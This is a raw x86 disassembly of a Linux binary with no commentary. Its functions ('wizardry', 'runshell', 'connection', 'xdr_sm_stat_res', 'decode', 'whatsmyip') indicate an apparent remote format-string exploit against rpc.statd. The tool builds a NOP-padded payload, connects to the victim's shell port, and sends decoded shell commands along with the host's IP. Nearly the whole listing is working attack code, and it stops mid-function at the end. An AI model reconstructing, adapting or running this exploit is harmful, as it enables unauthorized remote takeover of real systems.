push   ebp
mov    ebp,esp
push   ebx
push   eax
call   8048912 <_init+0xa>
pop    ebx
add    ebx,0x24fa
mov    eax,DWORD PTR [ebx+0xa4]
test   eax,eax
je     8048925 <_init+0x1d>
call   eax
lea    esi,[esi+0x0]
call   8048c50 <frame_dummy>
call   80499b0 <__do_global_ctors_aux>
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
push   DWORD PTR ds:0x804ae10
jmp    DWORD PTR ds:0x804ae14
add    BYTE PTR [eax],al
jmp    DWORD PTR ds:0x804ae18
push   0x0
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae1c
push   0x8
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae20
push   0x10
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae24
push   0x18
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae28
push   0x20
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae2c
push   0x28
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae30
push   0x30
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae34
push   0x38
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae38
push   0x40
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae3c
push   0x48
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae40
push   0x50
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae44
push   0x58
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae48
push   0x60
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae4c
push   0x68
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae50
push   0x70
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae54
push   0x78
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae58
push   0x80
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae5c
push   0x88
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae60
push   0x90
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae64
push   0x98
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae68
push   0xa0
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae6c
push   0xa8
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae70
push   0xb0
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae74
push   0xb8
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae78
push   0xc0
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae7c
push   0xc8
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae80
push   0xd0
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae84
push   0xd8
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae88
push   0xe0
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae8c
push   0xe8
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae90
push   0xf0
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae94
push   0xf8
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae98
push   0x100
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804ae9c
push   0x108
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804aea0
push   0x110
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804aea4
push   0x118
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804aea8
push   0x120
jmp    8048938 <.plt>
jmp    DWORD PTR ds:0x804aeac
push   0x128
jmp    8048938 <.plt>
xor    ebp,ebp
pop    esi
mov    ecx,esp
and    esp,0xfffffff8
push   eax
push   esp
push   edx
push   0x80499ec
push   0x8048908
push   ecx
push   esi
push   0x80494e0
call   8048a38 <__libc_start_main@plt>
hlt    
nop
nop
............
push   ebp
mov    edx,DWORD PTR ds:0x804acac
mov    ebp,esp
sub    esp,0x8
test   edx,edx
jne    8048c3b <__do_global_dtors_aux+0x5b>
mov    edx,DWORD PTR ds:0x804aca8
mov    eax,DWORD PTR [edx]
test   eax,eax
je     8048c18 <__do_global_dtors_aux+0x38>
lea    esi,[esi+eiz*1+0x0]
lea    eax,[edx+0x4]
mov    edx,DWORD PTR [edx]
mov    ds:0x804aca8,eax
call   edx
mov    edx,DWORD PTR ds:0x804aca8
mov    ecx,DWORD PTR [edx]
test   ecx,ecx
jne    8048c00 <__do_global_dtors_aux+0x20>
mov    eax,0x80489c8
test   eax,eax
je     8048c31 <__do_global_dtors_aux+0x51>
sub    esp,0xc
push   0x804adf8
call   80489c8 <__deregister_frame_info@plt>
add    esp,0x10
mov    eax,0x1
mov    ds:0x804acac,eax
mov    esp,ebp
pop    ebp
ret    
nop
push   ebp
mov    ebp,esp
sub    esp,0x8
mov    esp,ebp
pop    ebp
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
mov    eax,0x8048968
sub    esp,0x8
test   eax,eax
je     8048c74 <frame_dummy+0x24>
sub    esp,0x8
push   0x804af70
push   0x804adf8
call   8048968 <__register_frame_info@plt>
add    esp,0x10
mov    esp,ebp
pop    ebp
ret    
nop
lea    esi,[esi+eiz*1+0x0]
push   ebp
mov    ebp,esp
sub    esp,0x8
mov    esp,ebp
pop    ebp
ret    
nop
nop
push   ebp
mov    ebp,esp
sub    esp,0x4
mov    DWORD PTR [ebp-0x4],0x0
lea    esi,[esi+0x0]
mov    eax,DWORD PTR [ebp-0x4]
add    eax,DWORD PTR [ebp+0x8]
cmp    BYTE PTR [eax],0x0
jne    8048cac <decode+0x20>
jmp    8048cc8 <decode+0x3c>
lea    esi,[esi+0x0]
mov    eax,DWORD PTR [ebp-0x4]
mov    edx,DWORD PTR [ebp+0x8]
add    edx,eax
mov    eax,DWORD PTR [ebp-0x4]
add    eax,DWORD PTR [ebp+0x8]
mov    al,BYTE PTR [eax]
inc    eax
mov    BYTE PTR [edx],al
lea    eax,[ebp-0x4]
inc    DWORD PTR [eax]
jmp    8048c9c <decode+0x10>
mov    esi,esi
leave  
ret    
mov    esi,esi
push   ebp
mov    ebp,esp
sub    esp,0x38
sub    esp,0x8
push   0x10
lea    eax,[ebp-0x28]
push   eax
call   8048a88 <bzero@plt>
add    esp,0x10
sub    esp,0x8
push   0x8049a40
push   0x8049a42
call   8048b28 <fopen@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0xc],eax
sub    esp,0x4
push   DWORD PTR [ebp-0xc]
push   0x10
lea    eax,[ebp-0x28]
push   eax
call   80489e8 <fgets@plt>
add    esp,0x10
sub    esp,0x8
lea    eax,[ebp-0x28]
push   eax
push   0x804af90
call   8048b98 <strcpy@plt>
add    esp,0x10
sub    esp,0xc
push   0x804af90
call   80489f8 <strlen@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0x2c],eax
mov    eax,DWORD PTR [ebp-0x2c]
lea    edx,[eax-0x1]
mov    eax,0x804af90
cmp    BYTE PTR [edx+eax*1],0xa
jne    8048d69 <whatsmyip+0x9d>
sub    esp,0xc
push   0x804af90
call   80489f8 <strlen@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0x30],eax
mov    eax,DWORD PTR [ebp-0x30]
lea    edx,[eax-0x1]
mov    eax,0x804af90
mov    BYTE PTR [edx+eax*1],0x0
leave  
ret    
nop
push   ebp
mov    ebp,esp
sub    esp,0x8
sub    esp,0x4
push   0x400
push   DWORD PTR [ebp+0xc]
push   DWORD PTR [ebp+0x8]
call   8048b78 <xdr_string@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0x4],eax
cmp    DWORD PTR [ebp-0x4],0x0
jne    8048d98 <xdr_sm_name+0x2c>
mov    eax,0x0
jmp    8048d9d <xdr_sm_name+0x31>
mov    eax,0x1
leave  
ret    
nop
push   ebp
mov    ebp,esp
sub    esp,0x8
sub    esp,0x8
push   DWORD PTR [ebp+0xc]
push   DWORD PTR [ebp+0x8]
call   8048a28 <xdr_enum@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0x4],eax
cmp    DWORD PTR [ebp-0x4],0x0
jne    8048dc8 <xdr_res+0x28>
mov    eax,0x0
jmp    8048dcd <xdr_res+0x2d>
nop
mov    eax,0x1
leave  
ret    
nop
push   ebp
mov    ebp,esp
sub    esp,0x8
sub    esp,0x8
push   DWORD PTR [ebp+0xc]
push   DWORD PTR [ebp+0x8]
call   8048da0 <xdr_res>
add    esp,0x10
mov    DWORD PTR [ebp-0x4],eax
cmp    DWORD PTR [ebp-0x4],0x0
jne    8048df8 <xdr_sm_stat_res+0x28>
mov    eax,0x0
jmp    8048e25 <xdr_sm_stat_res+0x55>
nop
sub    esp,0x8
mov    eax,DWORD PTR [ebp+0xc]
add    eax,0x4
push   eax
push   DWORD PTR [ebp+0x8]
call   8048b38 <xdr_int@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0x8],eax
cmp    DWORD PTR [ebp-0x8],0x0
jne    8048e20 <xdr_sm_stat_res+0x50>
mov    eax,0x0
jmp    8048e25 <xdr_sm_stat_res+0x55>
lea    esi,[esi+0x0]
mov    eax,0x1
leave  
ret    
nop
push   ebp
mov    ebp,esp
sub    esp,0x8
sub    esp,0xc
push   0x0
call   8048a98 <exit@plt>
push   ebp
mov    ebp,esp
push   edi
push   esi
sub    esp,0x800
lea    eax,[ebp-0x8]
sub    eax,0x4c0
lea    eax,[ebp-0x4c8]
mov    DWORD PTR [ebp-0x7ac],eax
mov    DWORD PTR [ebp-0x7b0],0x8049aa0
cld    
mov    DWORD PTR [ebp-0x7b4],0xa
mov    edi,DWORD PTR [ebp-0x7ac]
mov    esi,DWORD PTR [ebp-0x7b0]
mov    ecx,DWORD PTR [ebp-0x7b4]
rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
lea    eax,[ebp-0x8]
sub    eax,0x4e0
lea    eax,[ebp-0x4e8]
mov    DWORD PTR [ebp-0x7b8],eax
mov    DWORD PTR [ebp-0x7bc],0x8049ac8
cld    
mov    DWORD PTR [ebp-0x7c0],0x13
mov    edi,DWORD PTR [ebp-0x7b8]
mov    esi,DWORD PTR [ebp-0x7bc]
mov    ecx,DWORD PTR [ebp-0x7c0]
rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
lea    eax,[ebp-0x8]
sub    eax,0x630
lea    eax,[ebp-0x638]
mov    DWORD PTR [ebp-0x7c4],eax
mov    DWORD PTR [ebp-0x7c8],0x8049adb
cld    
mov    DWORD PTR [ebp-0x7cc],0x13
mov    edi,DWORD PTR [ebp-0x7c4]
mov    esi,DWORD PTR [ebp-0x7c8]
mov    ecx,DWORD PTR [ebp-0x7cc]
rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
lea    eax,[ebp-0x8]
sub    eax,0x670
lea    eax,[ebp-0x678]
mov    DWORD PTR [ebp-0x7d0],eax
mov    DWORD PTR [ebp-0x7d4],0x8049b00
cld    
mov    DWORD PTR [ebp-0x7d8],0x31
mov    edi,DWORD PTR [ebp-0x7d0]
mov    esi,DWORD PTR [ebp-0x7d4]
mov    ecx,DWORD PTR [ebp-0x7d8]
rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
sub    esp,0xc
push   DWORD PTR ds:0x804af64
call   8048978 <fileno@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0x7e0],eax
mov    eax,DWORD PTR [ebp-0x7e0]
cmp    eax,DWORD PTR [ebp+0x8]
jle    8048f80 <runshell+0x148>
sub    esp,0xc
push   DWORD PTR ds:0x804af64
call   8048978 <fileno@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0x7e4],eax
mov    ecx,DWORD PTR [ebp-0x7e4]
inc    ecx
mov    DWORD PTR [ebp-0x7dc],ecx
jmp    8048f8a <runshell+0x152>
nop
mov    esi,DWORD PTR [ebp+0x8]
inc    esi
mov    DWORD PTR [ebp-0x7dc],esi
mov    edi,DWORD PTR [ebp-0x7dc]
mov    DWORD PTR [ebp-0x40c],edi
sub    esp,0xc
push   0x804acc0
call   8048c8c <decode>
add    esp,0x10
sub    esp,0xc
push   0x804acd4
call   8048c8c <decode>
add    esp,0x10
sub    esp,0xc
push   0x804ace6
call   8048c8c <decode>
add    esp,0x10
call   8048ccc <whatsmyip>
sub    esp,0x4
push   0x804af90
push   0x8049b40
lea    eax,[ebp-0x618]
push   eax
call   8048b48 <sprintf@plt>
add    esp,0x10
sub    esp,0xc
push   0x804acc0
push   0x804acd4
push   DWORD PTR ds:0x804acec
push   0x8049b80
lea    eax,[ebp-0x7a8]
push   eax
call   8048b48 <sprintf@plt>
add    esp,0x20
push   0x0
lea    eax,[ebp-0x4c8]
sub    esp,0x8
push   eax
call   80489f8 <strlen@plt>
add    esp,0xc
mov    DWORD PTR [ebp-0x7e8],eax
mov    eax,DWORD PTR [ebp-0x7e8]
push   eax
lea    eax,[ebp-0x4c8]
push   eax
push   DWORD PTR [ebp+0x8]
call   8048ad8 <send@plt>
add    esp,0x10
push   0x0
lea    eax,[ebp-0x4e8]
sub    esp,0x8
push   eax
call   80489f8 <strlen@plt>
add    esp,0xc
mov    DWORD PTR [ebp-0x7ec],eax
mov    eax,DWORD PTR [ebp-0x7ec]
push   eax
lea    eax,[ebp-0x4e8]
push   eax
push   DWORD PTR [ebp+0x8]
call   8048ad8 <send@plt>
add    esp,0x10
push   0x0
lea    eax,[ebp-0x618]
sub    esp,0x8
push   eax
call   80489f8 <strlen@plt>
add    esp,0xc
mov    DWORD PTR [ebp-0x7f0],eax
mov    eax,DWORD PTR [ebp-0x7f0]
push   eax
lea    eax,[ebp-0x618]
push   eax
push   DWORD PTR [ebp+0x8]
call   8048ad8 <send@plt>
add    esp,0x10
push   0x0
lea    eax,[ebp-0x638]
sub    esp,0x8
push   eax
call   80489f8 <strlen@plt>
add    esp,0xc
mov    DWORD PTR [ebp-0x7f4],eax
mov    eax,DWORD PTR [ebp-0x7f4]
push   eax
lea    eax,[ebp-0x638]
push   eax
push   DWORD PTR [ebp+0x8]
call   8048ad8 <send@plt>
add    esp,0x10
push   0x0
lea    eax,[ebp-0x678]
sub    esp,0x8
push   eax
call   80489f8 <strlen@plt>
add    esp,0xc
mov    DWORD PTR [ebp-0x7f8],eax
mov    eax,DWORD PTR [ebp-0x7f8]
push   eax
lea    eax,[ebp-0x678]
push   eax
push   DWORD PTR [ebp+0x8]
call   8048ad8 <send@plt>
add    esp,0x10
push   0x0
lea    eax,[ebp-0x7a8]
sub    esp,0x8
push   eax
call   80489f8 <strlen@plt>
add    esp,0xc
mov    DWORD PTR [ebp-0x7fc],eax
mov    eax,DWORD PTR [ebp-0x7fc]
push   eax
lea    eax,[ebp-0x7a8]
push   eax
push   DWORD PTR [ebp+0x8]
call   8048ad8 <send@plt>
add    esp,0x10
sub    esp,0xc
push   0x7270e00
call   8048948 <usleep@plt>
add    esp,0x10
sub    esp,0xc
push   0x0
call   8048a98 <exit@plt>
mov    esi,esi
push   ebp
mov    ebp,esp
sub    esp,0x18
sub    esp,0xc
push   0x9900
call   8048ae8 <htons@plt>
add    esp,0x10
mov    WORD PTR [ebp-0x6],ax
mov    ax,WORD PTR [ebp-0x6]
mov    WORD PTR [ebp+0xa],ax
sub    esp,0x4
push   0x6
push   0x1
push   0x2
call   8048b58 <socket@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0x4],eax
cmp    DWORD PTR [ebp-0x4],0x0
jns    80491b4 <connection+0x58>
sub    esp,0xc
push   0x8049bac
call   8048998 <perror@plt>
add    esp,0x10
sub    esp,0xc
push   0x1
call   8048a98 <exit@plt>
mov    esi,esi
sub    esp,0x4
push   0x10
lea    edx,[ebp+0x8]
mov    eax,edx
push   eax
push   DWORD PTR [ebp-0x4]
call   8048b08 <connect@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0xc],eax
cmp    DWORD PTR [ebp-0xc],0x0
jne    80491e1 <connection+0x85>
sub    esp,0xc
push   DWORD PTR [ebp-0x4]
call   8048e38 <runshell>
add    esp,0x10
sub    esp,0xc
push   DWORD PTR [ebp-0x4]
call   8048988 <close@plt>
add    esp,0x10
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
push   ebx
sub    esp,0x54
nop
mov    eax,DWORD PTR [ebp+0xc]
and    eax,0x3
test   eax,eax
jne    8049208 <wizardry+0x14>
jmp    8049210 <wizardry+0x1c>
lea    eax,[ebp+0xc]
dec    DWORD PTR [eax]
jmp    80491fc <wizardry+0x8>
nop
mov    eax,DWORD PTR [ebp+0x10]
add    eax,DWORD PTR [ebp+0xc]
add    eax,0x4
mov    DWORD PTR [ebp-0x24],eax
mov    al,BYTE PTR [ebp-0x24]
mov    BYTE PTR [ebp-0x15],al
cmp    BYTE PTR [ebp-0x15],0x0
je     8049230 <wizardry+0x3c>
cmp    BYTE PTR [ebp-0x15],0x24
je     8049230 <wizardry+0x3c>
jmp    804923c <wizardry+0x48>
sub    esp,0xc
push   0x1
call   8048a98 <exit@plt>
mov    esi,esi
mov    DWORD PTR [ebp-0x10],0x18
mov    edx,DWORD PTR [ebp-0x10]
mov    eax,DWORD PTR [ebp+0x10]
sub    eax,edx
dec    eax
mov    DWORD PTR [ebp+0x10],eax
sub    esp,0xc
mov    eax,DWORD PTR [ebp+0x10]
inc    eax
push   eax
call   80489b8 <malloc@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0x1c],eax
mov    eax,DWORD PTR [ebp-0x1c]
mov    DWORD PTR [ebp-0x1c],eax
test   eax,eax
jne    8049288 <wizardry+0x94>
sub    esp,0xc
push   0x8049bb5
call   8048998 <perror@plt>
add    esp,0x10
sub    esp,0xc
push   0x1
call   8048a98 <exit@plt>
mov    esi,esi
mov    eax,DWORD PTR [ebp-0x1c]
mov    DWORD PTR [ebp-0x20],eax
sub    esp,0x4
push   DWORD PTR [ebp+0x10]
push   0x90
push   DWORD PTR [ebp-0x20]
call   8048af8 <memset@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0x8],0x0
nop
cmp    DWORD PTR [ebp-0x8],0x3
jle    80492b4 <wizardry+0xc0>
jmp    8049318 <wizardry+0x124>
mov    DWORD PTR [ebp-0xc],0x0
nop
cmp    DWORD PTR [ebp-0xc],0x3
jle    80492f4 <wizardry+0x100>
sub    esp,0x4
push   0x4
mov    eax,DWORD PTR [ebp-0x20]
sub    eax,0x4
push   eax
push   DWORD PTR [ebp-0x20]
call   8048a58 <memcpy@plt>
add    esp,0x10
lea    eax,[ebp-0x20]
add    DWORD PTR [eax],0x4
lea    eax,[ebp-0x10]
add    DWORD PTR [eax],0x8
lea    eax,[ebp-0x8]
inc    DWORD PTR [eax]
lea    eax,[ebp-0x24]
inc    DWORD PTR [eax]
jmp    80492ac <wizardry+0xb8>
lea    esi,[esi+0x0]
mov    edx,DWORD PTR [ebp-0x20]
mov    eax,DWORD PTR [ebp-0xc]
mov    eax,eax
shl    eax,0x3
mov    DWORD PTR [ebp-0x30],eax
mov    eax,DWORD PTR [ebp-0x24]
mov    cl,BYTE PTR [ebp-0x30]
shr    eax,cl
mov    BYTE PTR [edx],al
lea    eax,[ebp-0x20]
inc    DWORD PTR [eax]
lea    eax,[ebp-0xc]
inc    DWORD PTR [eax]
jmp    80492bc <wizardry+0xc8>
lea    eax,[ebp-0x24]
sub    DWORD PTR [eax],0x4
mov    DWORD PTR [ebp-0x8],0x0
lea    esi,[esi+0x0]
mov    eax,DWORD PTR [ebp-0x8]
cmp    eax,DWORD PTR [ebp+0x18]
jl     8049334 <wizardry+0x140>
jmp    804935c <wizardry+0x168>
mov    esi,esi
sub    esp,0x4
push   0x3
push   0x8049bbe
push   DWORD PTR [ebp-0x20]
call   8048b18 <strncpy@plt>
add    esp,0x10
lea    eax,[ebp-0x20]
add    DWORD PTR [eax],0x3
lea    eax,[ebp-0x10]
add    DWORD PTR [eax],0x8
lea    eax,[ebp-0x8]
inc    DWORD PTR [eax]
jmp    8049328 <wizardry+0x134>
mov    eax,DWORD PTR [ebp+0x14]
add    eax,DWORD PTR [ebp+0xc]
mov    DWORD PTR [ebp-0x28],eax
mov    DWORD PTR [ebp-0x8],0x0
cmp    DWORD PTR [ebp-0x8],0x3
jle    8049378 <wizardry+0x184>
jmp    8049428 <wizardry+0x234>
nop
mov    eax,DWORD PTR [ebp-0x8]
mov    eax,eax
shl    eax,0x3
mov    DWORD PTR [ebp-0x34],eax
mov    eax,DWORD PTR [ebp-0x28]
mov    cl,BYTE PTR [ebp-0x34]
shr    eax,cl
and    eax,0xff
mov    DWORD PTR [ebp-0x14],eax
movzx  eax,BYTE PTR [ebp-0x10]
cmp    DWORD PTR [ebp-0x14],eax
jne    80493b8 <wizardry+0x1c4>
sub    esp,0x8
push   0x8049bc2
push   DWORD PTR [ebp-0x20]
call   8048b48 <sprintf@plt>
add    esp,0x10
lea    eax,[ebp-0x20]
add    DWORD PTR [eax],0x4
jmp    804941d <wizardry+0x229>
nop
mov    eax,DWORD PTR [ebp-0x14]
cmp    eax,DWORD PTR [ebp-0x10]
jl     80493e0 <wizardry+0x1ec>
mov    eax,DWORD PTR [ebp-0x14]
mov    DWORD PTR [ebp-0x38],eax
lea    edx,[ebp-0x10]
mov    DWORD PTR [ebp-0x4c],edx
mov    eax,DWORD PTR [ebp-0x38]
mov    ecx,DWORD PTR [ebp-0x4c]
cdq    
idiv   DWORD PTR [ecx]
mov    DWORD PTR [ebp-0x3c],edx
cmp    DWORD PTR [ebp-0x3c],0x8
jle    80493e0 <wizardry+0x1ec>
jmp    80493ec <wizardry+0x1f8>
lea    eax,[ebp-0x14]
add    DWORD PTR [eax],0x100
jmp    80493b8 <wizardry+0x1c4>
nop
mov    edx,DWORD PTR [ebp-0x10]
lea    eax,[ebp-0x14]
sub    DWORD PTR [eax],edx
mov    edx,DWORD PTR [ebp-0x14]
lea    eax,[ebp-0x10]
add    DWORD PTR [eax],edx
sub    esp,0x4
push   DWORD PTR [ebp-0x14]
push   0x8049bc9
push   DWORD PTR [ebp-0x20]
call   8048b48 <sprintf@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0x2c],eax
mov    edx,DWORD PTR [ebp-0x2c]
lea    eax,[ebp-0x20]
add    DWORD PTR [eax],edx
lea    eax,[ebp-0x8]
inc    DWORD PTR [eax]
jmp    804936c <wizardry+0x178>
nop
mov    eax,DWORD PTR [ebp-0x20]
mov    BYTE PTR [eax],0x90
sub    esp,0x4
sub    esp,0x8
push   DWORD PTR [ebp+0x8]
call   80489f8 <strlen@plt>
add    esp,0xc
mov    DWORD PTR [ebp-0x40],eax
mov    eax,DWORD PTR [ebp-0x40]
push   eax
push   DWORD PTR [ebp+0x8]
mov    eax,DWORD PTR [ebp+0x10]
mov    ebx,DWORD PTR [ebp-0x1c]
add    ebx,eax
push   DWORD PTR [ebp+0x8]
call   80489f8 <strlen@plt>
add    esp,0x4
mov    DWORD PTR [ebp-0x44],eax
mov    eax,DWORD PTR [ebp-0x44]
sub    ebx,eax
mov    eax,ebx
push   eax
call   8048a58 <memcpy@plt>
add    esp,0x10
mov    eax,DWORD PTR [ebp+0x10]
add    eax,DWORD PTR [ebp-0x1c]
mov    BYTE PTR [eax],0x0
mov    eax,DWORD PTR [ebp-0x1c]
mov    DWORD PTR [ebp-0x48],eax
mov    eax,DWORD PTR [ebp-0x48]
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
mov    esi,esi
push   ebp
mov    ebp,esp
sub    esp,0x8
sub    esp,0xc
push   DWORD PTR [ebp+0xc]
call   8048a78 <gethostbyname@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0x4],eax
cmp    DWORD PTR [ebp-0x4],0x0
jne    80494c0 <getip+0x38>
sub    esp,0xc
push   0x8049bd2
call   8048b68 <herror@plt>
add    esp,0x10
sub    esp,0xc
push   0x1
call   8048a98 <exit@plt>
nop
mov    eax,DWORD PTR [ebp-0x4]
mov    eax,DWORD PTR [eax+0x10]
mov    eax,DWORD PTR [eax]
sub    esp,0x4
push   0x4
push   eax
push   DWORD PTR [ebp+0x8]
call   8048a58 <memcpy@plt>
add    esp,0x10
mov    eax,DWORD PTR [ebp+0x8]
leave  
ret    0x4
push   ebp
mov    ebp,esp
push   edi
push   esi
sub    esp,0xa0
mov    DWORD PTR [ebp-0x4c],0xffffffff
mov    DWORD PTR [ebp-0x50],0x0
mov    DWORD PTR [ebp-0x54],0x5
mov    DWORD PTR [ebp-0x58],0x9
mov    DWORD PTR [ebp-0x5c],0x258
mov    DWORD PTR [ebp-0x60],0x400
mov    DWORD PTR [ebp-0x68],0x804ad00
mov    WORD PTR [ebp-0x6a],0x0
mov    DWORD PTR [ebp-0x70],0x0
mov    DWORD PTR [ebp-0x74],0xffffffff
mov    DWORD PTR ds:0x804af60,0x0
mov    esi,esi
sub    esp,0x4
push   0x8049be2
push   DWORD PTR [ebp+0xc]
push   DWORD PTR [ebp+0x8]
call   80489d8 <getopt@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0xc],eax
cmp    DWORD PTR [ebp-0xc],0xffffffff
jne    8049560 <main+0x80>
jmp    80496a0 <main+0x1c0>
mov    eax,DWORD PTR [ebp-0xc]
sub    eax,0x61
mov    DWORD PTR [ebp-0x90],eax
cmp    DWORD PTR [ebp-0x90],0x16
ja     8049688 <main+0x1a8>
mov    edx,DWORD PTR [ebp-0x90]
mov    eax,DWORD PTR [edx*4+0x8049c40]
jmp    eax
mov    DWORD PTR [ebp-0x50],0x1
jmp    804953c <main+0x5c>
lea    esi,[esi+0x0]
sub    esp,0x4
lea    eax,[ebp-0x6a]
push   eax
push   0x8049bf2
push   DWORD PTR ds:0x804af68
call   8048ab8 <sscanf@plt>
add    esp,0x10
jmp    804953c <main+0x5c>
sub    esp,0x4
lea    eax,[ebp-0x70]
push   eax
push   0x8049bf6
push   DWORD PTR ds:0x804af68
call   8048ab8 <sscanf@plt>
add    esp,0x10
jmp    804953c <main+0x5c>
nop
sub    esp,0xc
push   DWORD PTR ds:0x804af68
call   8048aa8 <atoi@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0x7c],eax
mov    eax,DWORD PTR [ebp-0x7c]
mov    DWORD PTR [ebp-0x60],eax
jmp    804953c <main+0x5c>
nop
sub    esp,0xc
push   DWORD PTR ds:0x804af68
call   8048aa8 <atoi@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0x80],eax
mov    eax,DWORD PTR [ebp-0x80]
mov    DWORD PTR [ebp-0x5c],eax
jmp    804953c <main+0x5c>
nop
sub    esp,0xc
push   DWORD PTR ds:0x804af68
call   8048aa8 <atoi@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0x84],eax
mov    eax,DWORD PTR [ebp-0x84]
mov    DWORD PTR [ebp-0x54],eax
jmp    804953c <main+0x5c>
lea    esi,[esi+0x0]
sub    esp,0xc
push   DWORD PTR ds:0x804af68
call   8048aa8 <atoi@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0x88],eax
mov    eax,DWORD PTR [ebp-0x88]
mov    DWORD PTR [ebp-0x58],eax
jmp    804953c <main+0x5c>
lea    esi,[esi+0x0]
sub    esp,0xc
push   DWORD PTR ds:0x804af68
call   8048aa8 <atoi@plt>
add    esp,0x10
mov    DWORD PTR [ebp-0x8c],eax
mov    eax,DWORD PTR [ebp-0x8c]
mov    DWORD PTR [ebp-0x4c],eax
jmp    804953c <main+0x5c>
lea    esi,[esi+0x0]
sub    esp,0xc
mov    eax,DWORD PTR [ebp+0xc]
push   DWORD PTR [eax]
call   8048e28 <usage>
add    esp,0x10
jmp    804953c <main+0x5c>
lea    esi,[esi+0x0]
mov    eax,ds:0x804af6c
imul   edx,eax,0x4
mov    eax,DWORD PTR [ebp+0xc]
mov    eax,DWORD PTR [eax+edx*1]
mov    DWORD PTR [ebp-0x64],eax
test   eax,eax
jne    80496c0 <main+0x1e0>
sub    esp,0xc
push   0x1
call   8048a98 <exit@plt>
nop
mov    eax,ds:0x804af6c
imul   edx,eax,0x4
mov    eax,DWORD PTR [ebp+0xc]
mov    eax,DWORD PTR [eax+edx*1]
mov    ds:0x804acec,eax
cmp    DWORD PTR [ebp-0x4c],0x0
js     8049779 <main+0x299>
cmp    DWORD PTR [ebp-0x4c],0x2
jbe    80496f0 <main+0x210>
sub    esp,0xc
push   0x1
call   8048a98 <exit@plt>
lea    esi,[esi+0x0]
mov    edx,DWORD PTR [ebp-0x4c]
mov    eax,edx
shl    eax,0x3
sub    eax,edx
lea    edx,[eax*4+0x0]
mov    eax,0x804ad90
mov    eax,DWORD PTR [edx+eax*1]
mov    DWORD PTR [ebp-0x68],eax
mov    edx,DWORD PTR [ebp-0x4c]
mov    eax,edx
shl    eax,0x3
sub    eax,edx
lea    edx,[eax*4+0x0]
mov    eax,0x804ad94
mov    eax,DWORD PTR [edx+eax*1]
mov    DWORD PTR [ebp-0x70],eax
mov    edx,DWORD PTR [ebp-0x4c]
mov    eax,edx
shl    eax,0x3
sub    eax,edx
shl    eax,0x2
lea    edx,[eax+0x10]
mov    eax,0x804ad88
mov    eax,DWORD PTR [edx+eax*1]
mov    DWORD PTR [ebp-0x60],eax
mov    edx,DWORD PTR [ebp-0x4c]
mov    eax,edx
shl    eax,0x3
sub    eax,edx
shl    eax,0x2
lea    edx,[eax+0x10]
mov    eax,0x804ad8c
mov    eax,DWORD PTR [edx+eax*1]
mov    DWORD PTR [ebp-0x5c],eax
mov    edx,DWORD PTR [ebp-0x4c]
mov    eax,edx
shl    eax,0x3
sub    eax,edx
shl    eax,0x2
lea    edx,[eax+0x10]
mov    eax,0x804ad90
mov    eax,DWORD PTR [edx+eax*1]
mov    DWORD PTR [ebp-0x58],eax
cmp    DWORD PTR [ebp-0x70],0x0
jne    804978c <main+0x2ac>
sub    esp,0xc
push   0x1
